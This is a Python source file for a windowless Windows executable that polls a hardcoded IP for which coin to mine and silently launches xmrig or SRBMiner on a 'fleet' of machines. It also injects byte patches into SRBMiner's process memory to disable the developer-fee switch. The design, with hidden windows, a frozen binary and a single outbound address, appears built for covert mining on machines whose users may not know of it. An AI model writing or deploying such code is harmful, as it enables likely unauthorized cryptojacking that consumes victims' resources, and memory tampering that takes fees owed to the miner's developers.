#!/usr/bin/env python3
"""Fleet scheduler + SRB dev-switch patcher, packaged as one windowless exe.

Everything runs from a single binary because the target machines have no
Python installed.  Two jobs:

  1. Ask 58.176.17.24:3333/coin every ten minutes which coin to mine.
  2. Keep the matching miner running:
        xmr -> xmrig.exe   (0-fee RandomX build)
        xel -> SRBMiner-MULTI.exe + in-memory patch

The patch is applied from inside this process rather than by spawning a
script: after PyInstaller freezes this file there is no .py on disk to run.
It rewrites four signature-matched functions in the loaded SRB image so the
dev-algorithm switch never fires.

Both miners talk only to 58.176.17.24:3333.  That single port answers HTTP for
/coin and forwards everything else as raw stratum, so the fleet never opens a
connection to any other address.
"""
import ctypes
import ctypes.wintypes as wt
import os
import subprocess
import sys
import time
import urllib.request

BASE = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, "frozen", False)
                                      else __file__))
COIN_URL = "http://58.176.17.24:3333/coin"
POLL = 600
XM = os.path.join(BASE, "xmrig", "xmrig.exe")
XM_CFG = os.path.join(BASE, "xmrig", "config.json")
SRB = os.path.join(BASE, "srbminer", "SRBMiner-MULTI.exe")
LOG = os.path.join(BASE, "miner.log")

SRB_ARGS = [
    SRB, "--algorithm", "xelishashv3",
    "--pool", "58.176.17.24:3333",
    # Kryptex wants the bare account name for XEL; the "xel:" prefix makes the
    # pool drop the connection.
    "--wallet", "krxYN6EMJQ.XMR_Proxy",
    "--log-file", "srb.log",
]

CREATE_NO_WINDOW = 0x08000000

# --------------------------------------------------------------------- patch --
k32 = ctypes.WinDLL("kernel32", use_last_error=True)
psapi = ctypes.WinDLL("psapi", use_last_error=True)

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
MEM_COMMIT = 0x1000
PAGE_GUARD = 0x100


class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [("BaseAddress", ctypes.c_void_p),
                ("AllocationBase", ctypes.c_void_p),
                ("AllocationProtect", wt.DWORD),
                ("RegionSize", ctypes.c_size_t),
                ("State", wt.DWORD),
                ("Protect", wt.DWORD),
                ("Type", wt.DWORD)]


PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_WRITECOPY = 0x80
EXEC_PROTECTS = (PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
                 PAGE_EXECUTE_WRITECOPY)


def _executable(protect):
    if protect & PAGE_GUARD:
        return False
    return (protect & 0xFF) in EXEC_PROTECTS


# name, signature, replacement -- all verified unique in SRBMiner 3.8.0
PATCHES = [
    ("switch_algo1",
     bytes([0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53,
            0x48, 0x83, 0xEC, 0x38, 0x48, 0x8D, 0x35, 0x1D]),
     bytes([0x31, 0xC0, 0xC3])),
    ("timerA",
     bytes([0x55, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x28,
            0x48, 0x89, 0xCE, 0xE8, 0x90, 0x77, 0x01, 0x00,
            0x48, 0x8B, 0x98, 0x68, 0x1C, 0x00, 0x00]),
     bytes([0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3])),
    ("timerB",
     bytes([0x55, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x28,
            0x89, 0xD3, 0x48, 0x89, 0xCE, 0x83, 0xFB, 0x03,
            0x76, 0x0E, 0x31, 0xC0]),
     bytes([0x31, 0xC0, 0xC3])),
    ("dev_want",
     bytes([0x55, 0x57, 0x56, 0x53, 0x48, 0x81, 0xEC, 0xB8,
            0x00, 0x00, 0x00, 0x31, 0xC0, 0x89, 0xD3, 0x83,
            0xFA, 0x03, 0x76, 0x0C]),
     bytes([0x31, 0xC0, 0xC3])),
]
TARGET_NAMES = ("kryptex_srbminer-multi.exe", "srbminer-multi.exe")
_state = {}


def log(msg):
    line = "%s %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg)
    print(line, flush=True)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass


def iter_pids():
    arr = (wt.DWORD * 4096)()
    needed = wt.DWORD()
    if not psapi.EnumProcesses(ctypes.byref(arr), ctypes.sizeof(arr),
                               ctypes.byref(needed)):
        return []
    return list(arr[:needed.value // ctypes.sizeof(wt.DWORD)])


def proc_name(pid):
    h = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not h:
        return None
    try:
        buf = ctypes.create_unicode_buffer(1024)
        if psapi.GetModuleBaseNameW(h, None, buf, wt.DWORD(1024)):
            return buf.value
        return None
    finally:
        k32.CloseHandle(h)


def scan_and_patch(pid):
    h = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
                        PROCESS_VM_WRITE | PROCESS_VM_OPERATION, False, pid)
    if not h:
        log("pid=%d OpenProcess failed err=%d" % (pid, ctypes.get_last_error()))
        return 0
    hits = []
    addr = 0
    mbi = MEMORY_BASIC_INFORMATION()
    try:
        while addr < 0x7FFFFFFFFFFF:
            got = k32.VirtualQueryEx(h, ctypes.c_void_p(addr), ctypes.byref(mbi),
                                     ctypes.sizeof(mbi))
            if not got:
                break
            base = mbi.BaseAddress or 0
            size = mbi.RegionSize or 0
            if size == 0:
                break
            if mbi.State == MEM_COMMIT and _executable(mbi.Protect) and size <= 64 * 1024 * 1024:
                buf = ctypes.create_string_buffer(size)
                read = ctypes.c_size_t(0)
                if k32.ReadProcessMemory(h, ctypes.c_void_p(base), buf,
                                         ctypes.c_size_t(size), ctypes.byref(read)) and read.value:
                    data = buf.raw[:read.value]
                    for name, sig, patch in PATCHES:
                        idx = data.find(sig)
                        while idx != -1:
                            hits.append((name, base + idx, patch))
                            idx = data.find(sig, idx + 1)
            addr = base + size

        done = 0
        for name, target, patch in hits:
            if (pid, name) in _state:
                continue
            wbuf = ctypes.create_string_buffer(patch, len(patch))
            if not k32.WriteProcessMemory(h, ctypes.c_void_p(target), wbuf,
                                          ctypes.c_size_t(len(patch)), None):
                continue
            _state[(pid, name)] = True
            done += 1
        return done
    finally:
        k32.CloseHandle(h)


def patch_srb():
    total = 0
    for pid in iter_pids():
        if pid == os.getpid():
            continue
        nm = proc_name(pid)
        if nm and nm.lower() in TARGET_NAMES:
            n = scan_and_patch(pid)
            if n:
                log("patched pid=%d (%d points)" % (pid, n))
                total += n
    return total


# ----------------------------------------------------------------- scheduler --
def get_coin():
    try:
        with urllib.request.urlopen(COIN_URL, timeout=15) as r:
            v = r.read().decode("utf-8", "replace").strip().lower()
        return v if v in ("xmr", "xel") else None
    except Exception:
        return None


def tasklist():
    try:
        return subprocess.run(["tasklist", "/FO", "CSV", "/NH"],
                              capture_output=True, text=True, errors="replace",
                              timeout=30).stdout.lower()
    except Exception:
        return ""


def is_running(name):
    return name.lower() in tasklist()


def kill(name):
    subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True, timeout=30)


def start(args, cwd):
    return subprocess.Popen(args, cwd=cwd, stdin=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            creationflags=CREATE_NO_WINDOW)


def ensure(coin):
    if coin == "xel":
        if is_running("xmrig.exe"):
            kill("xmrig.exe")
        if not is_running("SRBMiner-MULTI.exe"):
            start(SRB_ARGS, os.path.dirname(SRB))
            time.sleep(5)
            n = patch_srb()
            return "started SRBMiner, patched %d points" % n
        if patch_srb():
            return "re-patched SRBMiner"
        return None
    if is_running("SRBMiner-MULTI.exe"):
        kill("SRBMiner-MULTI.exe")
    if not is_running("xmrig.exe"):
        start([XM, "--config=" + XM_CFG], os.path.dirname(XM))
        return "started xmrig"
    return None


def main():
    log("scheduler up, poll=%ds, source=%s" % (POLL, COIN_URL))
    last = None
    while True:
        coin = get_coin()
        if coin is None:
            log("API unreachable; holding current miner")
            time.sleep(POLL)
            continue
        if coin != last:
            action = ensure(coin)
            log("coin=%s %s" % (coin, ("-> " + action) if action else "(already running)"))
            last = coin
        else:
            action = ensure(coin)
            if action:
                log("coin=%s -> %s" % (coin, action))
        time.sleep(POLL)


if __name__ == "__main__":
    main()
